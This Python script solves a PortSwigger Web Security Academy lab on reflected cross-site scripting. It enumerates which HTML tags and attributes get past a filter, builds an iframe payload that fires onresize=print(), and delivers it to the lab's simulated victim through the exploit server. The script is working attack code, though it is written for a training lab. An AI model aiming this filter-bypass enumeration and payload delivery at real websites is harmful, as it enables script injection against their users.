import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
# author: 0xyf


class XSS14:
    def __init__(self):
        self.lab_id = "0a69006303bd80f7c5a69aee009a0091"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"

    ########### Enumerating suitable tags and attributes ###########

    def query_tag(self, tag):
        params = {"search": f"<{tag}>"}
        response = requests.get(
            self.url, params=params, proxies=self.proxies, verify=False
        )
        if response.status_code == 200:
            return tag

    def enum_tags(self):
        with open(
            r"C:\Users\user\Documents\Labs\portswigger\xss\xss14\tags.txt", "r"
        ) as file:
            tags = [line.strip() for line in file.readlines()]

        with ThreadPoolExecutor(max_workers=15) as executor:
            self.found_tags = [
                x for x in executor.map(self.query_tag, tags) if x is not None
            ]

        return self.found_tags

    def query_attr(self, attribute):
        """
        Iterates through self.found_tags, to see working attribute for each tag.
        """
        payloads = []

        for tag in self.found_tags:
            params = {"search": f"<{tag} {attribute}>"}
            response = requests.get(
                self.url, params=params, proxies=self.proxies, verify=False
            )
            if response.status_code == 200:
                payloads.append(f"{tag} {attribute}")
                self.payloads.append(f"{tag} {attribute}")
        return payloads

    def enum_attr(self):
        with open(
            r"C:\Users\user\Documents\Labs\portswigger\xss\xss14\attributes.txt", "r"
        ) as file:
            attributes = [line.strip() for line in file.readlines()]

        self.payloads = []
        with ThreadPoolExecutor(max_workers=30) as executor:
            executor.map(self.query_attr, attributes)

        print(f"[*] self.payloads: {self.payloads}")

        self.payload = [x for x in self.payloads if "body" and "resize" in x][
            0
        ]  # assume we pick <body resize> payload

        print(f"[*] payload: {self.payload}")

    ########### Sending the exploit ###########

    def get_exploit_srv_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")

    def execute_request(self, data):
        r = requests.post(
            f"{self.exploit_srv_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def reflected_xss(self):
        self.get_exploit_srv_url()
        payload = f"""<iframe src="{self.url}/?search=<{self.payload}=print()>" onload=this.style.width='100px'></iframe>"""
        data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
            "responseBody": payload,
        }
        r = self.execute_request(data)

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.enum_tags()
        self.enum_attr()
        self.reflected_xss()
        self.check_solved()


def main():
    XSS14().solve()


if __name__ == "__main__":
    main()
